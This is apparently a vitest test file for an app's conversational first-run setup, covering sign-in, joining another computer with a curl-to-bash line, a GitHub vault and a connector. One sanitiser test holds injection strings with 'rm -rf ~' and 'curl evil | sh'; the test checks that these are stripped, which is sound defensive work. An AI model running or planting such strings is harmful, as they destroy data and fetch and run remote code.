import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { beforeEach, expect, it, vi, describe } from 'vitest'
import type { SetupDeps, SetupState } from './setup.ts'

// The first run is a conversation with weevboss (server/setup.ts): it speaks first, from what weevils detected, with no
// button; the subscription's sign-in, another computer and the connector all come as sentences in the chat; what
// weevboss is told in its first days (firstRunBrief); a job its turn cannot run goes to a session when agents ask.
const auth = vi.hoisted(() => ({ ready: false, tool: 'claude' as 'claude' | 'codex', pending: null as null | { url: string }, submitted: [] as string[] }))
vi.mock('./provider.ts', () => ({
  preferredTool: () => auth.tool,
  providerStatus: () => ({ installed: true, logged: auth.ready }),
  providerReady: () => auth.ready,
  codexLogged: () => false,
}))
vi.mock('./claude-login.ts', () => ({
  start: vi.fn(async () => 'https://claude.ai/oauth/authorize?code=abc'),
  output: () => '',
  cancel: vi.fn(),
  pending: () => auth.pending,
  submit: vi.fn(async (_d: unknown, code: string) => {
    auth.submitted.push(code)
    auth.ready = true
    return { ok: true }
  }),
}))
vi.mock('./claude-credentials.ts', () => ({ claudeLoggedIn: () => auth.ready }))
const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'setup-welcome-'))
process.env.WEEVILS_CONFIG = path.join(dir, 'env')
process.env.WEEVILS_LANG = 'en'
const { Setup, greeting, firstRunBrief, joinHost, looksLikeLoginCode, joinChoice, vaultLine, githubBrief } = await import('./setup.ts')
const { withLang } = await import('./i18n.ts')
const { DATA_DIR } = await import('./config.ts')
const { Join } = await import('./join.ts')

const machine = { kind: 'vps' as SetupState['machine']['kind'], mac: false, os: 'Ubuntu 24.04', cpus: 2, ramGb: 4, uptimeDays: 3, alwaysOn: true, host: 'box', user: 'user', sshTarget: 'user@203.0.113.7', agents: 2, others: [] as string[], othersAlwaysOn: false }
const state = (o: Partial<SetupState> & { others?: string[] } = {}): SetupState =>
  ({
    machine: { ...machine, others: o.others ?? [] },
    reach: 'public', url: 'https://weevils.example.com', https: true, port: 4179, clone: '~/weevils',
    claude: { installed: true, logged: auth.ready }, codex: { installed: false, logged: false }, github: { installed: true, logged: false },
    voice: { spoken: null, openai: false, https: true }, devil: { plugged: false }, mail: { on: false, authors: 0, pending: [] },
    phone: { devices: 1, push: 0 }, shortcut: false, security: { safe: true, https: true, exposedHttp: false }, quota: [],
    pkg: 'apt', sudo: 'no', tools: {} as SetupState['tools'], projects: 0, projectNames: [], connector: false, vault: { state: 'none', imported: false, without: [], said: [] },
    ...o,
  }) as SetupState
const both = { claude: true, codex: true }

beforeEach(() => {
  fs.rmSync(path.join(DATA_DIR, 'setup.json'), { force: true })
  auth.ready = false
  auth.tool = 'claude'
  auth.pending = null
  auth.submitted = []
  process.env.WEEVILS_SAFE = '1'
})

describe('the hello', () => {
  it('ready: who it is, what it already sees, then what to ask; no button, nothing about how it works', () => {
    auth.ready = true
    const text = greeting(state({ projects: 3, projectNames: ['weevils', 'notes', 'site'], others: ['laptop'] }), both)
    expect(text).toBe('Hi, I’m weevboss. I can already see your 3 projects (weevils, notes and site), and laptop is plugged in too. Tell me what you want done: an idea, a fix, a question about your code.')
    const fr = withLang('fr', () => greeting(state({ projects: 12, projectNames: ['a', 'b', 'c', 'd'] }), both))
    expect(fr).toBe('Salut, moi c’est weevboss. Je vois déjà tes 12 projets (a, b, c, d…). Dis-moi ce que tu veux faire : une idée, un correctif, une question sur ton code.')
    expect(greeting(state(), both)).toBe('Hi, I’m weevboss. Tell me what you want done: an idea, a fix, a question about your code.')
    for (const t of [text, fr]) expect(t).not.toMatch(/\[\[setup:|relay|thread|weevbook|session|fil\b/i)
  })

  it('no subscription signed in: Claude’s link in the hello itself, the code pasted here', () => {
    const text = greeting(state({ projects: 1, projectNames: ['notes'] }), both, 'https://claude.ai/oauth/authorize?code=abc')
    expect(text).toBe('Hi, I’m weevboss. I can already see your project (notes). To think, I use your own Claude subscription. Open [Claude’s sign-in page](https://claude.ai/oauth/authorize?code=abc), accept, then paste the code it shows here.')
    expect(greeting(state({ claude: { installed: true, logged: false } }), both)).toContain('the sign-in link comes right below')
    expect(greeting(state({ claude: { installed: false, logged: false } }), both)).toContain('I’m installing Claude Code on box first')
    auth.tool = 'codex'
    expect(greeting(state(), both)).toContain('your ChatGPT subscription, through Codex')
    auth.tool = 'claude'
    expect(greeting(state(), { claude: false, codex: true })).toContain('through Codex')
    expect(withLang('fr', () => greeting(state(), both, 'https://claude.ai/x'))).toContain('colle ici le code qu’elle affiche')
  })
})

describe('what weevboss is told in its first days', () => {
  it('the detected facts, so it asks none of them, and how each connection is made by talking', () => {
    const brief = firstRunBrief(state({ projects: 2, projectNames: ['weevils', 'notes'], others: ['laptop'], codex: { installed: true, logged: true } }), true)
    for (const fact of ['Claude Code signed in no', 'Codex signed in yes', 'GitHub signed in no', 'projects 2 (weevils, notes)', 'other machines: laptop', 'reached at https://weevils.example.com (public, https)', 'agents ask before acting yes', 'connector for ChatGPT and Claude.ai: off'])
      expect(brief).toContain(fact)
    expect(brief).toContain('never ask about it')
    expect(brief).toContain('onboarding is this conversation')
    expect(brief).toContain('`weevils setup ask machine` (posts the one line to paste in a terminal there)')
    expect(brief).toContain('`weevils setup ask connector`')
    expect(brief).toContain('never explain how weevils works inside')
    expect(firstRunBrief(state(), false)).toContain('cannot take one from a single line')
  })

  // docs/spec/07-vault.md: the vault is part of the welcome, and each state has one next step, by talking.
  it('the vault: none → GitHub by its code then setup; found → the recovery code; on → the summary once', () => {
    const none = firstRunBrief(state(), true)
    expect(none).toContain('their conversations kept on their own GitHub (the vault): not yet')
    expect(none).toContain('`weevils setup github` (posts the code and the link of GitHub in your name), then `weevils weevbook vault setup`, the 24 words once, the history question')
    // GitHub already signed in: straight to the vault.
    const logged = firstRunBrief(state({ github: { installed: true, logged: true, login: 'alex' } }), true)
    expect(logged).not.toContain('weevils setup github')
    expect(logged).toContain('without being asked: `weevils weevbook vault setup`')
    const found = firstRunBrief(state({ vault: { state: 'found', repo: 'alex/weevbook-vault', imported: false, without: [], said: [] } }), true)
    expect(found).toContain('a vault exists on their GitHub, not opened on this machine')
    expect(found).toContain('ask for their 24-word recovery code here in the chat, then `weevils weevbook vault restore --code "…"`')
    expect(found).not.toContain('vault setup')
    const on = (said: string[]) => firstRunBrief(state({ vault: { state: 'on', repo: 'alex/weevbook-vault', imported: true, without: [], said } }), true)
    expect(on(['code', 'history'])).toContain('(the vault): yes (alex/weevbook-vault)')
    expect(on(['code', 'history'])).toContain('`weevils weevbook vault summary --json` says the import is done, say the summary sentence once, then `weevils setup mark vault:summary`')
    expect(on(['code', 'history'])).not.toContain('vault setup')
    // Said: not again. Then the export, once; then nothing more about it.
    expect(on(['code', 'history', 'summary'])).not.toContain('vault summary')
    expect(on(['code', 'history', 'summary'])).toContain('offer once their Claude.ai and ChatGPT export, then `weevils setup mark vault:export`')
    expect(on(['code', 'history', 'summary', 'export'])).not.toMatch(/vault summary|export/)
  })

  it('`weevils setup` says where the vault stands, what was said already, and which computers lack it', () => {
    expect(vaultLine({ state: 'none', imported: false, without: [], said: [] })).toBe('vault: none (weevils setup github when GitHub is not signed in, then weevils weevbook vault setup)')
    expect(vaultLine({ state: 'found', repo: 'alex/weevbook-vault', imported: false, without: [], said: [] })).toContain('found on their GitHub (alex/weevbook-vault), not opened on this machine')
    expect(vaultLine({ state: 'on', repo: 'alex/weevbook-vault', imported: true, without: ['desk'], said: ['code', 'history'] })).toBe(
      'vault: on (alex/weevbook-vault) · this machine\'s history imported yes · recovery code given yes · history question asked yes · summary said no · Claude.ai and ChatGPT export offered no · plugged in without it (their line again fixes it): desk',
    )
    // A vault that was set up by hand, before weevboss knew of it: it has nothing to announce.
    expect(vaultLine({ state: 'on', repo: 'alex/weevbook-vault', imported: true, without: [], said: [] })).toBe('vault: on (alex/weevbook-vault) · set up outside your chat: nothing to say about it unless asked')
  })

  it('what weevboss is handed once GitHub’s code was typed: the next step for the vault, and that the person wrote nothing', () => {
    expect(githubBrief('alex', 'none')).toMatch(/^GitHub is signed in on this machine now \(alex\): the user typed the code on github\.com, they did not write this message\./)
    expect(githubBrief('alex', 'none')).toContain('run `weevils weevbook vault setup` now, give the 24 words it prints once')
    expect(githubBrief('alex', 'found')).toContain('`weevils weevbook vault restore --code "…"`')
    expect(githubBrief('', 'on')).not.toContain('vault')
  })
})

function make(deps: Partial<SetupDeps> = {}, s = state()) {
  const handoff = vi.fn(async () => {})
  const delegate = vi.fn(async () => {})
  const it = new Setup({ bump() {}, feed: () => ({ machines: [], projects: 0 }), remoteFacts: async () => [], devices: () => 0, push: () => 0, shortcut: () => false, seen: () => [], hasHistory: () => false, startMail() {}, handoff, delegate, ...deps } as SetupDeps)
  vi.spyOn(it, 'detect').mockImplementation(async () => {
    ;(it as unknown as { cache: unknown }).cache = { at: Date.now(), v: s }
    return s
  })
  const texts = () => it.messages().map((m) => m.text)
  return { it, handoff, delegate, texts }
}

describe('the first run, end to end', () => {
  it('weevboss speaks first with the sign-in link; the code pasted in the chat signs in, never reaches the model', async () => {
    const { it: s, texts } = make({}, state({ claude: { installed: true, logged: false }, projects: 1, projectNames: ['notes'] }))
    const mid = await s.welcome({ os: 'linux', mobile: false, standalone: false })
    expect(mid).toBeTruthy()
    expect(texts()).toEqual(['Hi, I’m weevboss. I can already see your project (notes). To think, I use your own Claude subscription. Open [Claude’s sign-in page](https://claude.ai/oauth/authorize?code=abc), accept, then paste the code it shows here.'])
    expect(await s.welcome({ os: 'linux', mobile: false, standalone: false })).toBeUndefined()
    // Something else typed first: the link again, no button.
    await s.offline('hello?')
    expect(texts().at(-1)).toContain('Open [Claude’s sign-in page]')
    // The code from Claude's page.
    auth.pending = { url: 'https://claude.ai/oauth/authorize?code=abc' }
    const code = 'Xy7_aBcDeFgHiJkLmNoPqRsTuV#st4te-123'
    await s.offline(code)
    expect(auth.submitted).toEqual([code])
    expect(texts()).toContain(code)
    expect(texts().at(-1)).toMatch(/^Claude Code is signed in/)
    for (const t of texts()) expect(t).not.toContain('[[setup:')
    const ctx = s.contextFor()
    expect(ctx).not.toContain(code)
    expect(ctx).toContain('(a sign-in code, not shown)')
    expect(ctx).toContain('onboarding is this conversation')
  })

  it('tells a pasted code from a sentence', () => {
    expect(looksLikeLoginCode('Xy7_aBcDeFgHiJkLmNoPqRsTuV#st4te-123')).toBe(true)
    expect(looksLikeLoginCode('abcDEF1234567890ghijKLMN')).toBe(true)
    for (const x of ['hello?', 'what can you do for me', 'supercalifragilisticexpialidocious', 'short1']) expect(looksLikeLoginCode(x), x).toBe(false)
  })

  it('an installation that already talked to weevboss is not welcomed', async () => {
    const { it: s, texts } = make({ hasHistory: () => true })
    expect(await s.welcome({ os: 'linux', mobile: false, standalone: false })).toBeUndefined()
    expect(texts()).toEqual([])
  })
})

describe('another computer, by talking', () => {
  it('one line to paste there, its code kept from the model; then the key, then the machine online', async () => {
    auth.ready = true
    const home = fs.mkdtempSync(path.join(os.tmpdir(), 'join-home-'))
    const join = new Join({ file: path.join(home, 'join.json'), authorizedKeys: path.join(home, '.ssh', 'authorized_keys'), service: '/home/user/.local/bin/weevils-service', remotes: () => '', machineIds: () => ['box'] })
    const machines: { id: string; name: string; online?: boolean }[] = []
    const { it: s, texts } = make({ join, sshd: async () => true, feed: () => ({ machines, projects: 0 }) })
    expect(await s.ask('machine')).toBe(false)
    const line = /`(curl -fsSL https:\/\/weevils\.example\.com\/api\/join\.sh \| bash -s ([A-Za-z0-9_-]+))`/.exec(texts().at(-1)!)
    expect(line).not.toBeNull()
    expect(texts().at(-1)).toMatch(/^On your other computer, open a terminal and paste this line:/)
    expect(join.open(line![2])?.target).toBe('user@weevils.example.com')
    expect(s.contextFor()).not.toContain(line![2])
    s.joined('laptop')
    expect(texts().at(-1)).toBe('laptop is plugging in: weevils is installing there, a few minutes.')
    machines.push({ id: 'laptop', name: 'laptop', online: true })
    await (s as unknown as { watch: () => Promise<void> }).watch()
    expect(texts().at(-1)).toBe('laptop is plugged in: I can run agents there now.')
  })

  // docs/spec/07-vault.md, « The history »: a date or a few conversations for the other computer ride on its line.
  it('the line carries what to bring of that computer’s history: a day, or plain words, and nothing else', async () => {
    expect(joinChoice({})).toBe('')
    expect(joinChoice({ since: '2026-10-01' })).toBe(' --since 2026-10-01')
    expect(joinChoice({ match: 'invoice exporter' })).toBe(" --match 'invoice exporter'")
    expect(joinChoice({ match: 'l’export des factures, été' })).toBe(" --match 'l export des factures été'")
    // Nothing a shell would read: quotes, substitutions and separators are dropped; a date that is not one is ignored.
    expect(joinChoice({ since: '2026-10-01; rm -rf ~', match: "x'; curl evil | sh; '$(id)`id`" })).toBe(" --match 'x curl evil sh id id'")
    auth.ready = true
    const home = fs.mkdtempSync(path.join(os.tmpdir(), 'join-home-'))
    const join = new Join({ file: path.join(home, 'join.json'), authorizedKeys: path.join(home, '.ssh', 'authorized_keys'), service: '/home/user/.local/bin/weevils-service', remotes: () => '', machineIds: () => ['box'] })
    const { it: s, texts } = make({ join, sshd: async () => true })
    await s.ask('machine', undefined, false, { since: '2026-10-01' })
    expect(texts().at(-1)).toMatch(/`curl -fsSL https:\/\/weevils\.example\.com\/api\/join\.sh \| bash -s [A-Za-z0-9_-]+ --since 2026-10-01`/)
    expect(s.contextFor()).toContain('bash -s •••• --since 2026-10-01')
  })

  it('only from a public https address; SSH to that name, or to a VPS’s public IP behind a tunnel', () => {
    expect(joinHost(state())).toBe('weevils.example.com')
    const tunnel = { url: 'https://some-words-here.trycloudflare.com', reach: 'public' as const }
    expect(joinHost(state(tunnel))).toBe('203.0.113.7')
    expect(joinHost({ ...state(tunnel), machine: { ...machine, sshTarget: 'user@192.168.1.4' } })).toBeNull()
    expect(joinHost({ ...state(tunnel), machine: { ...machine, kind: 'laptop' as const, sshTarget: 'user@laptop' } })).toBeNull()
    // Plain http (local, home network, a public IP without https): the answer could be tampered with on the way.
    expect(joinHost(state({ reach: 'local', https: false, url: 'http://127.0.0.1:4179' }))).toBeNull()
    expect(joinHost(state({ reach: 'lan', https: false, url: 'http://192.168.1.4:4179' }))).toBeNull()
    expect(joinHost(state({ reach: 'public', https: false, url: 'http://203.0.113.7:4179' }))).toBeNull()
  })

  it('a machine that cannot take one from a line: the masked field for its address, as before', async () => {
    auth.ready = true
    const home = fs.mkdtempSync(path.join(os.tmpdir(), 'join-home-'))
    const join = new Join({ file: path.join(home, 'join.json'), authorizedKeys: path.join(home, '.ssh', 'authorized_keys'), service: '/home/user/.local/bin/weevils-service', remotes: () => '', machineIds: () => ['box'] })
    for (const [s, sshd] of [[state({ reach: 'local', https: false, url: 'http://127.0.0.1:4179' }), true], [state(), false]] as const) {
      const { it: x, texts } = make({ join, sshd: async () => sshd }, s)
      expect(await x.ask('machine')).toBe(true)
      expect(texts().at(-1)).toContain('[[setup:machine]]')
      expect(texts().at(-1)).not.toContain('/api/join.sh')
    }
    expect(fs.existsSync(path.join(home, 'join.json'))).toBe(false)
  })
})

describe('GitHub, by talking (the vault needs it once)', () => {
  // A stand-in for gh: its device sign-in prints the code and the address the way gh 2.x does, waits for the code to
  // be « typed » (a file), then answers as signed in.
  function fakeGh() {
    const bin = fs.mkdtempSync(path.join(os.tmpdir(), 'fake-gh-'))
    const typed = path.join(bin, 'typed')
    fs.writeFileSync(path.join(bin, 'gh'), `#!/bin/sh
case "$1 $2" in
  "auth login")
    echo "$*" >"${bin}/login-args"
    echo "! First copy your one-time code: AB12-CD34" >&2
    echo "Open this URL to continue in your web browser: https://github.com/login/device" >&2
    while [ ! -f "${typed}" ]; do sleep 0.05; done
    [ "$(cat "${typed}")" = ok ] ;;
  "api user") [ -f "${typed}" ] && echo alex ;;
  "auth setup-git") touch "${bin}/setup-git" ;;
  *) exit 1 ;;
esac
`, { mode: 0o755 })
    const before = process.env.PATH
    process.env.PATH = `${bin}${path.delimiter}${before}`
    return { bin, typed, restore: () => (process.env.PATH = before) }
  }
  const until = async (ok: () => boolean) => {
    for (let i = 0; i < 100 && !ok(); i++) await new Promise((r) => setTimeout(r, 50))
    expect(ok()).toBe(true)
  }

  it('one sentence with the code and the github.com/login/device link; once typed, weevboss is told and carries on', async () => {
    auth.ready = true
    const gh = fakeGh()
    try {
      const { it: s, handoff, texts } = make()
      expect(await s.githubDevice()).toBe('posted')
      expect(texts()).toEqual(['Sign in to your GitHub, just once: open [github.com/login/device](https://github.com/login/device) and type this code: **AB12-CD34** (valid 15 minutes). I’ll carry on as soon as it’s done.'])
      expect(fs.readFileSync(path.join(gh.bin, 'login-args'), 'utf8').trim()).toBe('auth login --hostname github.com --git-protocol https --web --scopes workflow')
      // Asked again while it waits: the same sentence, not a second code.
      expect(await s.githubDevice()).toBe('posted')
      expect(texts()).toHaveLength(1)
      expect(handoff).not.toHaveBeenCalled()
      fs.writeFileSync(gh.typed, 'ok')
      await until(() => handoff.mock.calls.length === 1)
      const [said, brief] = handoff.mock.calls[0] as unknown as string[]
      expect(said).toBe('GitHub is connected.')
      expect(brief).toContain('GitHub is signed in on this machine now (alex)')
      expect(brief).toContain('weevils weevbook vault setup')
      // No button, no command for the person, and the generic « GitHub plugged in » line is not added on top.
      expect(texts()).toHaveLength(1)
      expect(texts()[0]).not.toMatch(/\[\[setup:|`/)
      await until(() => fs.existsSync(path.join(gh.bin, 'setup-git')))
    } finally {
      gh.restore()
    }
  })

  it('a sign-in that does not finish says so in one sentence; nothing to do when GitHub is already signed in', async () => {
    auth.ready = true
    const gh = fakeGh()
    try {
      const { it: s, handoff, texts } = make()
      expect(await s.githubDevice()).toBe('posted')
      fs.writeFileSync(gh.typed, 'expired')
      // (« api user » answers now, but gh itself gave up: the code was never accepted.)
      await until(() => texts().length === 2)
      expect(texts()[1]).toBe('GitHub didn’t sign in (no answer). Tell me when you want to try again.')
      expect(handoff).not.toHaveBeenCalled()
      const done = make({}, state({ github: { installed: true, logged: true, login: 'alex' } }))
      expect(await done.it.githubDevice()).toBe('signed-in')
      expect(done.texts()).toHaveLength(2)
    } finally {
      gh.restore()
    }
  })
})

describe('the connector, by talking', () => {
  it('turned on at once and kept on, with the address and the clicks for both chat apps', async () => {
    auth.ready = true
    const connectorOn = vi.fn()
    const { it: s, texts } = make({ connectorOn })
    expect(await s.ask('connector')).toBe(false)
    expect(connectorOn).toHaveBeenCalledTimes(1)
    expect(fs.readFileSync(process.env.WEEVILS_CONFIG!, 'utf8')).toContain('WEEVILS_CONNECTOR=1')
    const said = texts().at(-1)!
    expect(said).toContain('`https://weevils.example.com/mcp`')
    expect(said).toContain('Claude.ai: Settings → Connectors → Add custom connector')
    expect(said).toContain('ChatGPT: Settings → Apps & Connectors')
    expect(said).toContain('access code')
    delete process.env.WEEVILS_CONNECTOR
  })

  it('not reachable over public https: one sentence on what it needs, nothing turned on', async () => {
    auth.ready = true
    const connectorOn = vi.fn()
    const { it: s, texts } = make({ connectorOn }, state({ reach: 'local', https: false, url: 'http://127.0.0.1:4179' }))
    await s.ask('connector')
    expect(connectorOn).not.toHaveBeenCalled()
    expect(texts().at(-1)).toContain('only reach me at a public https address')
  })
})

describe('agents ask before acting: what weevboss’s turn cannot run goes to a session', () => {
  const mac = () => state({ machine: { ...machine, kind: 'laptop' as const, mac: true, os: 'macOS 15.1', sshTarget: 'user@mac' }, reach: 'local', https: false, url: 'http://127.0.0.1:4179', sudo: 'password', pkg: 'brew' })
  it('ask mode: the job opens a session, and weevboss says so in one sentence', async () => {
    auth.ready = true
    const { it: s, handoff, delegate, texts } = make({}, mac())
    await s.ask('reach')
    expect(handoff).not.toHaveBeenCalled()
    expect(delegate).toHaveBeenCalledTimes(1)
    expect((delegate.mock.calls[0] as unknown as string[])[0]).toBe('Make me reachable from anywhere with Tailscale.')
    expect(texts().at(-1)).toBe('I’ve handed it to an agent: it asks for your OK in the app before each step.')
  })

  it('bypass mode: weevboss does it in its own turn', async () => {
    auth.ready = true
    process.env.WEEVILS_SAFE = '0'
    const { it: s, handoff, delegate } = make({}, mac())
    await s.ask('reach')
    expect(delegate).not.toHaveBeenCalled()
    expect(handoff).toHaveBeenCalledTimes(1)
  })
})
